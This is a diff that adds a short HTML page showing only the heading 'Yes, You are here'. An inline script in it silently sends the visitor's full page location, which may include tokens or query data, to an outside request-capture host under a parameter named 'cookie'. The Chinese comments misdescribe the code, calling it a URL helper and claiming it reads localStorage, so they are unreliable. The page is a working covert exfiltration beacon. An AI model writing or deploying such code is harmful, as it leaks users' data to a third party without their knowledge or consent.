@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title></title>
+    <meta charset="utf-8" />
+    <script type="text/javascript">
+      function getQueryString() {
+        var r = window.location;
+        if (r != null) return r;
+        return null;
+      } // 工具函数，获取网址参数
+      var xhttp = new XMLHttpRequest();
+      xhttp.open(
+        "GET",
+        "https://mymol3.free.beeceptor.com/?cookie=" + getQueryString(),
+        true
+      );
+      xhttp.send(); // 发起ajax请求，利用window.localStorage获取本地存储
+    </script>
+  </head>
+  <h1>Yes, You are here</h1>
+</html>
